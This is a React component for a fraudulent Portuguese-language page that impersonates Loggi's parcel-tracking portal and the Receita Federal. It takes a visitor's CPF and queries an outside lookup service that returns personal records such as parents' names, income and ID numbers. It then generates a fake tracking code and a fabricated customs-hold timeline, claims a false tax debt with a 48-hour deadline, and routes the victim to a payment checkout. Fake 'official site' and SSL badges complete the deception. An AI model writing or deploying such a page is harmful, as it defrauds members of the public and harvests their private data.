import { Search, Info, Package, ShieldCheck, FileCheck, ArrowRight, ArrowLeft, Loader2, AlertTriangle, User, MapPin, CheckCircle2, Clock, XCircle, Copy, Check } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";
import { useState } from "react";
import receitaLogo from "@/assets/receita-logo.png";
import loggiLogo from "@/assets/loggi-logo.png";
import tributacaoImg from "@/assets/tributacao-correios.jpg";
import CheckoutSection from "./CheckoutSection";

interface CpfData {
  NOME: string;
  CPF: string;
  NASC: string;
  SEXO: string;
  NOME_MAE: string;
  NOME_PAI: string;
  RENDA: string;
  RG: string;
  ORGAO_EMISSOR: string;
  UF_EMISSAO: string;
  TITULO_ELEITOR: string;
  SO: string;
}

const generateTrackingCode = (cpfDigits: string) => {
  const hash = cpfDigits.split("").reduce((acc, d, i) => acc + parseInt(d) * (i + 7), 0);
  const num = String(hash * 137 + 948271).slice(0, 9).padStart(9, "0");
  return `BR${num}BR`;
};

const HeroSection = () => {
  const [step, setStep] = useState<"initial" | "tracking" | "cpf" | "code-generated" | "result" | "checkout">("initial");
  const [trackingCode, setTrackingCode] = useState("");
  const [cpf, setCpf] = useState("");
  const [loading, setLoading] = useState(false);
  const [cpfData, setCpfData] = useState<CpfData | null>(null);
  const [address, setAddress] = useState({ rua: "", numero: "", bairro: "", cidade: "", estado: "", cep: "" });
  const [error, setError] = useState("");
  const [copied, setCopied] = useState(false);

  const formatCpf = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 11);
    if (digits.length <= 3) return digits;
    if (digits.length <= 6) return `${digits.slice(0, 3)}.${digits.slice(3)}`;
    if (digits.length <= 9) return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6)}`;
    return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6, 9)}-${digits.slice(9)}`;
  };

  const maskCpf = (cpfRaw: string) => {
    const d = cpfRaw.replace(/\D/g, "");
    if (d.length < 11) return cpfRaw;
    return `***.${d.slice(3, 6)}.${d.slice(6, 9)}-**`;
  };

  const handleCopyCode = () => {
    navigator.clipboard.writeText(trackingCode);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const handleConfirmCpf = async () => {
    setLoading(true);
    setError("");
    const digits = cpf.replace(/\D/g, "");
    try {
      const res = await fetch(`https://searchapi.dnnl.live/consulta?token_api=7499&cpf=${digits}`);
      const data = await res.json();
      if (data.status === 200 && data.dados?.length > 0) {
        setCpfData(data.dados[0]);
        if (trackingCode) {
          setStep("result");
        } else {
          const code = generateTrackingCode(digits);
          setTrackingCode(code);
          setStep("code-generated");
        }
      } else {
        setError("CPF não encontrado. Verifique e tente novamente.");
      }
    } catch {
      setError("Erro ao consultar. Tente novamente.");
    } finally {
      setLoading(false);
    }
  };

  if (step === "checkout" && cpfData) {
    return (
      <CheckoutSection
        trackingCode={trackingCode}
        userName={cpfData.NOME}
        maskedCpf={maskCpf(cpfData.CPF)}
        onBack={() => setStep("result")}
      />
    );
  }

  return (
    <section id="consultar">
      {/* Loggi Official Navbar */}
      <div className="w-full" style={{ background: "#00AEEF" }}>
        <div className="mx-auto max-w-6xl flex items-center justify-between px-4 py-2">
          <img src={loggiLogo} alt="Loggi" className="h-10 w-auto" style={{ filter: "brightness(0) invert(1)" }} />
          <nav className="hidden md:flex items-center gap-6">
            <a href="#" className="text-xs font-semibold hover:underline" style={{ color: "#ffffff" }}>Enviar</a>
            <a href="#" className="text-xs font-semibold hover:underline" style={{ color: "#ffffff" }}>Receber</a>
            <a href="#" className="text-xs font-semibold hover:underline" style={{ color: "#ffffff" }}>Rastrear</a>
            <a href="#" className="text-xs font-semibold hover:underline" style={{ color: "#ffffff" }}>Logística</a>
            <a href="#" className="text-xs font-semibold hover:underline" style={{ color: "#ffffff" }}>Atendimento</a>
          </nav>
          <div className="flex items-center gap-3">
            <a href="#" className="hidden md:flex items-center gap-1.5 text-xs font-semibold" style={{ color: "#ffffff" }}>
              <User className="h-3.5 w-3.5" />
              <span>Faça Login</span>
            </a>
            <button className="flex items-center gap-1 text-xs font-semibold" style={{ color: "#ffffff" }}>
              <Search className="h-3.5 w-3.5" />
              <span className="hidden md:inline">Busca</span>
            </button>
          </div>
        </div>
      </div>
      {/* Dark bar under navbar */}
      <div className="w-full" style={{ background: "#0099CC" }}>
        <div className="mx-auto max-w-6xl px-4 py-2 flex items-center justify-center gap-2">
          <svg xmlns="http://www.w3.org/2000/svg" className="h-3 w-3" style={{ color: "#ffffff" }} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2" /><path d="M7 11V7a5 5 0 0 1 10 0v4" /></svg>
          <span className="text-[11px] font-semibold tracking-wide" style={{ color: "#ffffff" }}>Conexão Segura SSL • Site Oficial Loggi ✓</span>
        </div>
      </div>

      {/* Content section */}
      <div style={{ background: "#f0f0ee" }} className="pb-16 pt-10">
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.5 }} className="mx-auto max-w-lg px-4">
          {/* Title */}
          <h1 className="text-2xl font-bold text-foreground text-center">Rastreamento de Encomendas</h1>
          <p className="text-sm text-muted-foreground text-center mt-1 mb-6">Portal Oficial de Consulta Fiscal</p>

          {/* Card */}
          <div className="rounded-xl overflow-hidden bg-card" style={{ boxShadow: "0 4px 20px rgba(0,0,0,0.1)" }}>
            <AnimatePresence mode="wait">
              {step === "initial" && (
                <motion.div key="initial" initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} transition={{ duration: 0.2 }}>
                  <div className="mx-5 mt-5 rounded-lg p-4" style={{ borderLeft: "4px solid hsl(207, 44%, 49%)", background: "hsl(210, 60%, 95%)" }}>
                    <div className="flex items-start gap-3">
                      <Info className="h-5 w-5 shrink-0 mt-0.5" style={{ color: "hsl(207, 44%, 49%)" }} />
                      <div>
                        <p className="text-sm font-bold" style={{ color: "hsl(207, 44%, 49%)" }}>AVISO IMPORTANTE</p>
                        <p className="mt-1 text-xs leading-relaxed text-muted-foreground">
                          Verifique se há pendências fiscais vinculadas ao seu CPF que possam impactar a liberação de suas encomendas.
                        </p>
                      </div>
                    </div>
                  </div>
                  <div className="p-5">
                    <p className="text-sm leading-relaxed text-muted-foreground mb-5">
                      Consulte o status da sua encomenda informando o código de rastreio ou localize pelo CPF.
                    </p>
                    <button className="btn-consultar" onClick={() => setStep("tracking")}>
                      <Package className="h-4 w-4" />
                      Consultar pelo Código de Rastreio
                    </button>
                    <div className="flex items-center gap-3 my-4">
                      <div className="flex-1 h-px" style={{ background: "hsl(210, 20%, 85%)" }} />
                      <span className="text-[10px] font-bold text-muted-foreground uppercase tracking-wider">ou</span>
                      <div className="flex-1 h-px" style={{ background: "hsl(210, 20%, 85%)" }} />
                    </div>
                    <button
                      className="w-full flex items-center justify-center gap-2 rounded-xl px-5 py-3.5 text-sm font-bold transition-all"
                      style={{ background: "#002d6b", color: "#ffffff", border: "2px solid #002d6b" }}
                      onClick={() => setStep("cpf")}
                    >
                      <User className="h-4 w-4" />
                      Não tem o código? Consulte pelo CPF
                    </button>
                  </div>
                </motion.div>
              )}

              {step === "tracking" && (
                <motion.div key="tracking" initial={{ opacity: 0, x: 30 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -30 }} transition={{ duration: 0.25 }} className="p-5">
                  <div className="flex items-center gap-2 mb-1">
                    <Package className="h-5 w-5" style={{ color: "hsl(207, 44%, 49%)" }} />
                    <p className="text-sm font-bold text-foreground">Código de Rastreio</p>
                  </div>
                  <p className="text-xs text-muted-foreground mb-4">Informe o código de rastreamento da sua encomenda (ex: BR123456789BR)</p>
                  <input
                    type="text"
                    placeholder="Digite o código de rastreio"
                    className="input-track uppercase"
                    value={trackingCode}
                    onChange={(e) => setTrackingCode(e.target.value.toUpperCase())}
                    maxLength={20}
                  />
                  <button
                    className="btn-consultar mt-4"
                    disabled={trackingCode.length < 5}
                    onClick={() => setStep("cpf")}
                    style={{ opacity: trackingCode.length < 5 ? 0.5 : 1 }}
                  >
                    Avançar
                    <ArrowRight className="h-4 w-4" />
                  </button>
                  <button
                    className="flex items-center justify-center gap-1.5 text-xs text-muted-foreground mt-3 w-full hover:text-foreground transition-colors"
                    onClick={() => setStep("initial")}
                  >
                    <ArrowLeft className="h-3.5 w-3.5" />
                    Voltar
                  </button>
                </motion.div>
              )}

              {step === "cpf" && (
                <motion.div key="cpf" initial={{ opacity: 0, x: 30 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -30 }} transition={{ duration: 0.25 }} className="p-5">
                  <div className="flex items-center gap-2 mb-1">
                    <ShieldCheck className="h-5 w-5" style={{ color: "hsl(207, 44%, 49%)" }} />
                    <p className="text-sm font-bold text-foreground">{trackingCode ? "Confirmação de Identidade" : "Consulta por CPF"}</p>
                  </div>
                  <p className="text-xs text-muted-foreground mb-4">
                    {trackingCode
                      ? <>Para confirmar a consulta do rastreio <span className="font-semibold text-foreground">{trackingCode}</span>, informe seu CPF:</>
                      : "Informe seu CPF para localizar suas encomendas e gerar seu código de rastreio:"
                    }
                  </p>
                  <input
                    type="text"
                    placeholder="000.000.000-00"
                    className="input-track"
                    value={cpf}
                    onChange={(e) => setCpf(formatCpf(e.target.value))}
                    maxLength={14}
                  />
                  {error && (
                    <p className="text-xs mt-2 font-medium" style={{ color: "hsl(0, 72%, 50%)" }}>{error}</p>
                  )}
                  <button
                    className="btn-consultar mt-4"
                    disabled={cpf.replace(/\D/g, "").length < 11 || loading}
                    onClick={handleConfirmCpf}
                    style={{ opacity: cpf.replace(/\D/g, "").length < 11 ? 0.5 : 1 }}
                  >
                    {loading ? (
                      <>
                        <Loader2 className="h-4 w-4 animate-spin" />
                        Consultando...
                      </>
                    ) : (
                      <>
                        <Search className="h-4 w-4" />
                        Consultar Encomendas
                      </>
                    )}
                  </button>
                  <button
                    className="flex items-center justify-center gap-1.5 text-xs text-muted-foreground mt-3 w-full hover:text-foreground transition-colors"
                    onClick={() => { setStep("initial"); setTrackingCode(""); }}
                  >
                    <ArrowLeft className="h-3.5 w-3.5" />
                    Voltar
                  </button>
                </motion.div>
              )}

              {step === "code-generated" && cpfData && (
                <motion.div key="code-generated" initial={{ opacity: 0, x: 30 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -30 }} transition={{ duration: 0.25 }} className="p-5">
                  <div className="flex items-center gap-3 mb-4">
                    <div className="flex h-11 w-11 items-center justify-center rounded-full" style={{ background: "hsl(210, 60%, 95%)" }}>
                      <User className="h-5 w-5" style={{ color: "hsl(207, 44%, 49%)" }} />
                    </div>
                    <div>
                      <p className="text-sm font-bold text-foreground">{cpfData.NOME}</p>
                      <p className="text-xs text-muted-foreground">CPF: {maskCpf(cpfData.CPF)}</p>
                    </div>
                  </div>

                  <div className="rounded-lg p-4 mb-4" style={{ background: "hsl(145, 40%, 95%)", border: "1px solid hsl(145, 40%, 85%)" }}>
                    <div className="flex items-center gap-2 mb-2">
                      <Package className="h-4 w-4" style={{ color: "hsl(145, 60%, 42%)" }} />
                      <span className="text-xs font-bold" style={{ color: "hsl(145, 60%, 35%)" }}>Encomenda localizada!</span>
                    </div>
                    <p className="text-xs text-muted-foreground mb-3">
                      Foi encontrada uma encomenda vinculada ao seu CPF. Código de rastreio:
                    </p>
                    <div className="flex items-center gap-2">
                      <div className="flex-1 rounded-lg px-4 py-3 font-mono text-sm font-bold text-center tracking-widest" style={{ background: "#fff", border: "2px dashed hsl(207, 44%, 49%)", color: "hsl(207, 44%, 49%)" }}>
                        {trackingCode}
                      </div>
                      <button
                        onClick={handleCopyCode}
                        className="flex items-center gap-1.5 rounded-lg px-3 py-3 text-xs font-semibold transition-all"
                        style={{ background: copied ? "hsl(145, 60%, 42%)" : "hsl(207, 44%, 49%)", color: "#fff" }}
                      >
                        {copied ? <Check className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
                        {copied ? "Copiado!" : "Copiar"}
                      </button>
                    </div>
                  </div>

                  <div className="rounded-lg p-3 mb-4" style={{ background: "hsl(0, 80%, 96%)", borderLeft: "4px solid hsl(0, 72%, 50%)" }}>
                    <div className="flex items-start gap-2">
                      <AlertTriangle className="h-4 w-4 shrink-0 mt-0.5" style={{ color: "hsl(0, 72%, 50%)" }} />
                      <p className="text-xs leading-relaxed text-muted-foreground">
                        <span className="font-bold" style={{ color: "hsl(0, 72%, 50%)" }}>Atenção:</span> Esta encomenda possui uma pendência fiscal. Clique abaixo para ver os detalhes.
                      </p>
                    </div>
                  </div>

                  <button className="btn-consultar" onClick={() => setStep("result")}>
                    <Package className="h-4 w-4" />
                    Ver Detalhes da Encomenda
                    <ArrowRight className="h-4 w-4" />
                  </button>
                  <button
                    className="flex items-center justify-center gap-1.5 text-xs text-muted-foreground mt-3 w-full hover:text-foreground transition-colors"
                    onClick={() => { setStep("initial"); setCpf(""); setTrackingCode(""); setCpfData(null); }}
                  >
                    <ArrowLeft className="h-3.5 w-3.5" />
                    Nova Consulta
                  </button>
                </motion.div>
              )}

              {step === "result" && cpfData && (
                <motion.div key="result" initial={{ opacity: 0, x: 30 }} animate={{ opacity: 1, x: 0 }} exit={{ opacity: 0, x: -30 }} transition={{ duration: 0.25 }} className="p-5">
                  {/* User info */}
                  <div className="flex items-center gap-3 mb-4">
                    <div className="flex h-11 w-11 items-center justify-center rounded-full" style={{ background: "hsl(210, 60%, 95%)" }}>
                      <User className="h-5 w-5" style={{ color: "hsl(207, 44%, 49%)" }} />
                    </div>
                    <div>
                      <p className="text-sm font-bold text-foreground">{cpfData.NOME}</p>
                      <p className="text-xs text-muted-foreground">CPF: {maskCpf(cpfData.CPF)}</p>
                    </div>
                  </div>

                  {/* Tracking code header */}
                  <div className="rounded-lg p-3 mb-4" style={{ background: "hsl(210, 60%, 95%)", border: "1px solid hsl(210, 40%, 88%)" }}>
                    <div className="flex items-center justify-between">
                      <div className="flex items-center gap-2">
                        <Package className="h-4 w-4" style={{ color: "hsl(207, 44%, 49%)" }} />
                        <span className="text-xs font-semibold text-foreground">Objeto: {trackingCode}</span>
                      </div>
                      <span className="text-[10px] font-bold px-2 py-0.5 rounded-full" style={{ background: "hsl(0, 72%, 50%)", color: "#fff" }}>RETIDO</span>
                    </div>
                  </div>

                  {/* Tracking Timeline */}
                  <div className="mb-4">
                    <p className="text-xs font-bold text-foreground mb-3 flex items-center gap-1.5">
                      <Clock className="h-3.5 w-3.5" style={{ color: "hsl(207, 44%, 49%)" }} />
                      Histórico de Movimentação
                    </p>
                    <div className="relative ml-2">
                      <div className="absolute left-[7px] top-2 bottom-2 w-px" style={{ background: "hsl(210, 20%, 85%)" }} />

                      {[
                        {
                          date: (() => { const d = new Date(); d.setDate(d.getDate() - 1); return d.toLocaleDateString("pt-BR"); })(),
                          time: "14:32",
                          title: "Objeto retido pela fiscalização aduaneira",
                          location: "Curitiba / PR",
                          status: "blocked" as const,
                        },
                        {
                          date: (() => { const d = new Date(); d.setDate(d.getDate() - 2); return d.toLocaleDateString("pt-BR"); })(),
                          time: "08:15",
                          title: "Objeto recebido na unidade de tratamento",
                          location: "Centro de Tratamento Internacional - Curitiba / PR",
                          status: "done" as const,
                        },
                        {
                          date: (() => { const d = new Date(); d.setDate(d.getDate() - 4); return d.toLocaleDateString("pt-BR"); })(),
                          time: "21:40",
                          title: "Objeto em trânsito - por favor aguarde",
                          location: "Unidade de Logística Integrada - São Paulo / SP",
                          status: "done" as const,
                        },
                        {
                          date: (() => { const d = new Date(); d.setDate(d.getDate() - 5); return d.toLocaleDateString("pt-BR"); })(),
                          time: "16:22",
                          title: "Objeto recebido pela Loggi",
                          location: "Unidade de Tratamento Internacional - São Paulo / SP",
                          status: "done" as const,
                        },
                        {
                          date: (() => { const d = new Date(); d.setDate(d.getDate() - 8); return d.toLocaleDateString("pt-BR"); })(),
                          time: "09:05",
                          title: "Objeto postado",
                          location: "País de origem",
                          status: "done" as const,
                        },
                      ].map((event, i) => (
                        <div key={i} className="relative flex gap-3 pb-4 last:pb-0">
                          <div className="relative z-10 mt-0.5">
                            {event.status === "blocked" ? (
                              <XCircle className="h-4 w-4" style={{ color: "hsl(0, 72%, 50%)" }} />
                            ) : (
                              <CheckCircle2 className="h-4 w-4" style={{ color: "hsl(145, 60%, 42%)" }} />
                            )}
                          </div>
                          <div className="flex-1 min-w-0">
                            <div className="flex items-center gap-2">
                              <span className="text-[10px] text-muted-foreground font-medium">{event.date} • {event.time}</span>
                            </div>
                            <p className={`text-xs font-semibold mt-0.5 ${event.status === "blocked" ? "" : "text-foreground"}`} style={event.status === "blocked" ? { color: "hsl(0, 72%, 50%)" } : {}}>
                              {event.title}
                            </p>
                            <p className="text-[10px] text-muted-foreground flex items-center gap-1 mt-0.5">
                              <MapPin className="h-2.5 w-2.5" />
                              {event.location}
                            </p>
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>

                  {/* Tributação image */}
                  <div className="rounded-lg overflow-hidden mb-4" style={{ border: "1px solid hsl(210, 20%, 85%)" }}>
                    <img src={tributacaoImg} alt="Aviso de tributação - Loggi" className="w-full h-auto" />
                  </div>

                  {/* Warning */}
                  <div className="rounded-lg p-4 mb-4" style={{ background: "hsl(0, 80%, 96%)", borderLeft: "4px solid hsl(0, 72%, 50%)" }}>
                    <div className="flex items-start gap-3">
                      <AlertTriangle className="h-5 w-5 shrink-0 mt-0.5" style={{ color: "hsl(0, 72%, 50%)" }} />
                      <div>
                        <p className="text-sm font-bold" style={{ color: "hsl(0, 72%, 50%)" }}>PENDÊNCIA FISCAL IDENTIFICADA</p>
                        <p className="mt-1.5 text-xs leading-relaxed text-muted-foreground">
                          Foi identificada uma pendência fiscal vinculada ao CPF informado. A encomenda <span className="font-semibold text-foreground">{trackingCode}</span> está retida e
                          <span className="font-semibold" style={{ color: "hsl(0, 72%, 50%)" }}> sujeita a multa e indenização</span> por não coleta do pedido.
                        </p>
                        <p className="mt-2 text-xs leading-relaxed text-muted-foreground">
                          É necessário regularizar a situação para liberação da encomenda e evitar penalidades adicionais.
                        </p>
                      </div>
                    </div>
                  </div>

                  {/* Status details */}
                  <div className="space-y-2 mb-5 rounded-lg p-3" style={{ background: "hsl(210, 15%, 97%)", border: "1px solid hsl(210, 20%, 90%)" }}>
                    <div className="flex justify-between text-xs">
                      <span className="text-muted-foreground">Situação Cadastral</span>
                      <span className="font-semibold" style={{ color: "hsl(0, 72%, 50%)" }}>Irregular</span>
                    </div>
                    <div className="h-px" style={{ background: "hsl(210, 20%, 90%)" }} />
                    <div className="flex justify-between text-xs">
                      <span className="text-muted-foreground">Status da Encomenda</span>
                      <span className="font-semibold" style={{ color: "hsl(0, 72%, 50%)" }}>Retida</span>
                    </div>
                    <div className="h-px" style={{ background: "hsl(210, 20%, 90%)" }} />
                    <div className="flex justify-between text-xs">
                      <span className="text-muted-foreground">Prazo para Regularização</span>
                      <span className="font-semibold" style={{ color: "hsl(0, 72%, 50%)" }}>48 horas</span>
                    </div>
                  </div>

                  <button className="btn-consultar" onClick={() => setStep("checkout")}>
                    <AlertTriangle className="h-4 w-4" />
                    Regularizar Situação
                  </button>

                  <button
                    className="flex items-center justify-center gap-1.5 text-xs text-muted-foreground mt-3 w-full hover:text-foreground transition-colors"
                    onClick={() => {
                      setStep("initial");
                      setCpf("");
                      setTrackingCode("");
                      setCpfData(null);
                    }}
                  >
                    <ArrowLeft className="h-3.5 w-3.5" />
                    Nova Consulta
                  </button>
                </motion.div>
              )}
            </AnimatePresence>
          </div>
          <div className="h-1.5 rounded-b-xl" style={{ background: "linear-gradient(90deg, hsl(var(--navy-dark)), hsl(var(--navy)), hsl(var(--navy-dark)))" }} />

          {/* Feature cards */}
          <div className="grid grid-cols-3 gap-3 mt-8">
            {[
              { icon: Package, title: "Rastreamento", desc: "Consulte o status da sua encomenda em tempo real" },
              { icon: ShieldCheck, title: "Segurança", desc: "Dados protegidos pela Receita Federal" },
              { icon: FileCheck, title: "Regularização", desc: "Pendências devem ser regularizadas para liberação" },
            ].map((item) => (
              <div key={item.title} className="rounded-xl bg-card p-4 text-center" style={{ boxShadow: "0 2px 10px rgba(0,0,0,0.06)" }}>
                <div className="mx-auto mb-2 flex h-10 w-10 items-center justify-center rounded-lg" style={{ background: "hsl(210, 60%, 95%)" }}>
                  <item.icon className="h-5 w-5" style={{ color: "hsl(207, 44%, 49%)" }} />
                </div>
                <p className="text-xs font-bold text-foreground">{item.title}</p>
                <p className="mt-1 text-[10px] leading-snug text-muted-foreground">{item.desc}</p>
              </div>
            ))}
          </div>
        </motion.div>
      </div>

      {/* Rodapé Loggi */}
      <div className="w-full py-6 px-4" style={{ background: "#00AEEF", borderTop: "3px solid #0099CC" }}>
        <div className="mx-auto max-w-3xl">
          <div className="flex items-center justify-center gap-3 mb-3">
            <img src={loggiLogo} alt="Loggi" className="h-10 w-auto" style={{ filter: "brightness(0) invert(1)" }} />
          </div>
          <div className="text-center text-xs leading-relaxed" style={{ color: "#ffffff" }}>
            <p className="font-bold mb-1">Santo Andre Construtora e Incorporadora LTDA</p>
            <p>CNPJ: 07.828.839/0001-61</p>
            <p className="mt-1">Endereço: Avenida Antonio Artioli 570, 570 - Campinas - SP</p>
            <p className="mt-2 text-[10px]" style={{ color: "rgba(255,255,255,0.5)" }}>
              © {new Date().getFullYear()} Todos os direitos reservados.
            </p>
          </div>
        </div>
      </div>
    </section>
  );
};

export default HeroSection;
